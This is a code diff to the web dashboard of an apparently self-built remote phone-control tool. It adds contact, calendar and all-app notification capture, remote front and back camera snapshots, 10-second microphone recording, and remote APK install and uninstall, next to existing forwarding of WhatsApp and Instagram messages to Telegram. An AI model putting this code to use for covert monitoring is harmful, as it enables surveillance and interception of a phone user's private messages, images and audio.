@@ -94,7 +94,10 @@ export const DASHBOARD_HTML = String.raw`<!doctype html>
   <div class="tab" data-tab="calls">Calls</div>
   <div class="tab" data-tab="location">Location</div>
   <div class="tab" data-tab="files">Files</div>
-  <div class="tab" data-tab="apps">Apps</div>
+   <div class="tab" data-tab="apps">Apps</div>
+  <div class="tab" data-tab="contacts">Contacts</div>
+  <div class="tab" data-tab="calendar">Calendar</div>
+  <div class="tab" data-tab="allnotifs">All Notifs</div>
   <div class="tab" data-tab="settings">Settings</div>
 </div>
 
@@ -147,6 +150,26 @@ export const DASHBOARD_HTML = String.raw`<!doctype html>
 </div>
 <div class="panel" id="panel-apps"><div id="appsList"></div><div class="empty" id="appsEmpty">Loading...</div></div>
 
+<div class="panel" id="panel-contacts">
+  <div class="row"><input id="contactsSearch" type="text" placeholder="Search contacts..."><button class="small" id="contactsGo">Search</button></div>
+  <div id="contactsList"></div><div class="empty" id="contactsEmpty">Loading...</div>
+</div>
+
+<div class="panel" id="panel-calendar">
+  <div class="srow">
+    <h3>Add event</h3>
+    <div class="row"><input id="evTitle" type="text" placeholder="Title"></div>
+    <div class="row"><input id="evStart" type="datetime-local"><input id="evEnd" type="datetime-local"></div>
+    <div class="row"><input id="evLoc" type="text" placeholder="Location (optional)"><button class="small" id="evAdd">Add event</button></div>
+  </div>
+  <div id="calendarList"></div><div class="empty" id="calendarEmpty">Loading...</div>
+</div>
+
+<div class="panel" id="panel-allnotifs">
+  <div class="row"><label><input id="captureAllToggle" type="checkbox"> Capture notifications from every app (not just WhatsApp/Instagram)</label></div>
+  <div id="allNotifsList"></div><div class="empty" id="allNotifsEmpty">Toggle on, then click the tab again to refresh.</div>
+</div>
+
 <div class="panel" id="panel-settings">
   <div class="srow"><h3>Phone name</h3><div class="row"><input id="setNick" type="text" placeholder="New name"><button class="small" id="btnNick">Rename</button></div></div>
   <div class="srow"><h3>Clipboard</h3><div class="row"><button class="small" id="btnClipGet">Get clipboard</button><input id="clipSetText" type="text" placeholder="Text to push to phone"><button class="small" id="btnClipSet">Set clipboard</button></div><div id="clipResult" class="csub"></div></div>
@@ -155,6 +178,25 @@ export const DASHBOARD_HTML = String.raw`<!doctype html>
   <div class="srow"><h3>Telegram alerts (every WhatsApp/Instagram message pushes here, even if this page is closed)</h3><div class="row"><input id="tgToken" type="text" placeholder="Bot token"><input id="tgChat" type="text" placeholder="Chat ID"><button class="small" id="btnTg">Save</button></div></div>
   <div class="srow"><h3>Scheduled command</h3><div class="row"><input id="schedMin" type="text" placeholder="Every N minutes (0=off)" style="max-width:160px"><input id="schedCmd" type="text" placeholder="Command, e.g. show my screenshots"><button class="small" id="btnSched">Save</button></div></div>
   <div class="srow"><h3>App usage (today)</h3><button class="small" id="btnUsage">Load</button><div id="usageList"></div></div>
+  <div class="srow"><h3>Quick actions</h3>
+    <div class="row">
+      <button class="small" id="btnFlashOn">Flashlight on</button>
+      <button class="small" id="btnFlashOff">Flashlight off</button>
+      <input id="volInput" type="text" placeholder="Volume % (0-100)" style="max-width:140px">
+      <button class="small" id="btnVol">Set volume</button>
+    </div>
+    <div class="row">
+      <button class="small" id="btnWifi">Open Wifi settings</button>
+      <button class="small" id="btnBt">Open Bluetooth settings</button>
+      <button class="small" id="btnCamBack">Camera snapshot (back)</button>
+      <button class="small" id="btnCamFront">Camera snapshot (front)</button>
+      <button class="small" id="btnMic">Record mic (10s)</button>
+    </div>
+  </div>
+  <div class="srow"><h3>Install / uninstall app (phone shows the system confirm screen - not silent)</h3>
+    <div class="row"><input id="apkFile" type="file" accept=".apk"><button class="small" id="btnInstall">Push + install</button></div>
+    <div class="row"><input id="uninstPkg" type="text" placeholder="Package name, e.g. com.example.app"><button class="small danger" id="btnUninstall">Uninstall</button></div>
+  </div>
 </div>
 
 <div id="full"></div>
@@ -271,7 +313,7 @@ function updateDevices(phones) {
 }
 
 // ---------- tabs ----------
-var AUTOREFRESH_TABS = ['calls', 'apps', 'location', 'whatsapp', 'instagram', 'sms'];
+var AUTOREFRESH_TABS = ['calls', 'apps', 'location', 'whatsapp', 'instagram', 'sms', 'allnotifs'];
 function switchTab(tab) {
   if (currentTab === 'screen' && tab !== 'screen') sendTo([selectedId()], { type: 'screen_stop' }, true);
   currentTab = tab;
@@ -299,6 +341,9 @@ function loadTab(tab, isSwitch) {
   else if (tab === 'calls') sendTo([id], { type: 'get_call_log' }, true);
   else if (tab === 'location') sendTo([id], { type: 'get_location' }, true);
   else if (tab === 'apps') sendTo([id], { type: 'get_apps' }, true);
+  else if (tab === 'contacts') sendTo([id], { type: 'get_contacts', query: $('contactsSearch').value || '' }, true);
+  else if (tab === 'calendar') sendTo([id], { type: 'get_calendar', daysAhead: 14 }, true);
+  else if (tab === 'allnotifs') sendTo([id], { type: 'get_all_notifications' }, true);
   if (tab === 'videos' && isSwitch) sendTo([id], { type: 'get_videos', offset: 0 }, true);
 }
 
@@ -388,6 +433,34 @@ function renderApps(m) {
   var items = m.items || [];
   $('appsEmpty').style.display = items.length ? 'none' : 'block';
   items.forEach(function (a) { box.appendChild(el('div', 'callrow', a.name)); });
+}
+function renderContacts2(m) {
+  var box = $('contactsList'); box.innerHTML = '';
+  var items = m.items || [];
+  $('contactsEmpty').style.display = items.length ? 'none' : 'block';
+  items.forEach(function (c) {
+    var nums = (c.numbers || []).join(', ');
+    box.appendChild(el('div', 'callrow', c.name + (nums ? ' - ' + nums : '')));
+  });
+}
+function renderCalendar(m) {
+  var box = $('calendarList'); box.innerHTML = '';
+  var items = m.items || [];
+  $('calendarEmpty').style.display = items.length ? 'none' : 'block';
+  items.forEach(function (ev) {
+    var row = el('div', 'callrow');
+    row.appendChild(el('span', '', ev.title + (ev.location ? ' @ ' + ev.location : '')));
+    row.appendChild(el('span', '', new Date(ev.start).toLocaleString()));
+    box.appendChild(row);
+  });
+}
+function renderAllNotifs(m) {
+  var box = $('allNotifsList'); box.innerHTML = '';
+  var items = m.items || [];
+  $('allNotifsEmpty').style.display = items.length ? 'none' : 'block';
+  items.forEach(function (n) {
+    box.appendChild(el('div', 'line', '[' + (n.appLabel || n.packageName) + '] ' + esc(n.sender) + ': ' + esc(n.message)));
+  });
 }
 function renderUsage(m) {
   var box = $('usageList'); box.innerHTML = '';
@@ -515,12 +588,18 @@ function handle(m) {
   }
   else if (m.type === 'apps') renderApps({ from: from, items: m.items });
   else if (m.type === 'usage') renderUsage(m);
-  else if (m.type === 'screen_frame') {
+   else if (m.type === 'screen_frame') {
     $('screenEmpty').style.display = 'none';
     $('screenImg').style.display = 'block';
     $('screenImg').src = 'data:image/jpeg;base64,' + m.data;
     $('screenImg').dataset.from = from;
   }
+  else if (m.type === 'contacts') renderContacts2({ from: from, items: m.items });
+  else if (m.type === 'calendar') renderCalendar({ from: from, items: m.items });
+  else if (m.type === 'all_notifications') renderAllNotifs({ from: from, items: m.items });
+  else if (m.type === 'generic_notification') { log('[' + nameOf(from) + ' / ' + (m.app || m.packageName) + '] ' + esc(m.sender) + ': ' + esc(m.message)); notify((m.sender || m.app) + ' (' + nameOf(from) + ')', m.message); }
+  else if (m.type === 'camera_photo') showFull(m.data);
+  else if (m.type === 'audio_clip') { var a3 = document.createElement('a'); a3.href = 'data:audio/m4a;base64,' + m.data; a3.download = 'haiderbrain-audio.m4a'; a3.click(); log(nameOf(from) + ': audio clip downloaded'); }
 }
 
 // ---------- connection ----------
@@ -620,8 +699,41 @@ $('btnSched').onclick = function () {
   var mins = parseInt($('schedMin').value, 10) || 0;
   var cmd = $('schedCmd').value.trim();
   sendTo([selectedId()], { type: 'set_schedule', minutes: mins, command: cmd });
+};$('btnUsage').onclick = function () { sendTo([selectedId()], { type: 'get_usage' }); };
+
+$('contactsGo').onclick = function () { sendTo([selectedId()], { type: 'get_contacts', query: $('contactsSearch').value || '' }); };
+$('evAdd').onclick = function () {
+  var title = $('evTitle').value.trim();
+  var s = $('evStart').value, e2 = $('evEnd').value;
+  if (!title || !s || !e2) { log('Fill title, start and end', 'err'); return; }
+  sendTo([selectedId()], { type: 'add_calendar_event', title: title, start: new Date(s).getTime(), end: new Date(e2).getTime(), location: $('evLoc').value || '' });
 };
-$('btnUsage').onclick = function () { sendTo([selectedId()], { type: 'get_usage' }); };
+$('captureAllToggle').onchange = function () { sendTo([selectedId()], { type: 'set_capture_all_notifs', enabled: $('captureAllToggle').checked }); };
+
+$('btnFlashOn').onclick = function () { sendTo([selectedId()], { type: 'set_flashlight', on: true }); };
+$('btnFlashOff').onclick = function () { sendTo([selectedId()], { type: 'set_flashlight', on: false }); };
+$('btnVol').onclick = function () { var p = parseInt($('volInput').value, 10); if (!isNaN(p)) sendTo([selectedId()], { type: 'set_volume', percent: p }); };
+$('btnWifi').onclick = function () { sendTo([selectedId()], { type: 'open_wifi_settings' }); };
+$('btnBt').onclick = function () { sendTo([selectedId()], { type: 'open_bluetooth_settings' }); };
+$('btnCamBack').onclick = function () { log('Requesting camera snapshot...'); sendTo([selectedId()], { type: 'camera_snapshot', front: false }); };
+$('btnCamFront').onclick = function () { log('Requesting camera snapshot...'); sendTo([selectedId()], { type: 'camera_snapshot', front: true }); };
+$('btnMic').onclick = function () { log('Recording 10s of audio...'); sendTo([selectedId()], { type: 'record_audio', seconds: 10 }); };
+
+function fileToBase64(file, cb) {
+  var reader = new FileReader();
+  reader.onload = function () { cb(reader.result.split(',')[1]); };
+  reader.readAsDataURL(file);
+}
+$('btnInstall').onclick = function () {
+  var f = $('apkFile').files[0];
+  if (!f) { log('Pick an APK file first', 'err'); return; }
+  log('Uploading APK (' + Math.round(f.size / 1024 / 1024) + 'MB)...');
+  fileToBase64(f, function (b64) { sendTo([selectedId()], { type: 'install_apk', data: b64 }); });
+};
+$('btnUninstall').onclick = function () {
+  var pkg = $('uninstPkg').value.trim();
+  if (pkg) sendTo([selectedId()], { type: 'uninstall_app', package: pkg });
+};
 
 (function init() {
   $('cards').dataset.sel = '';
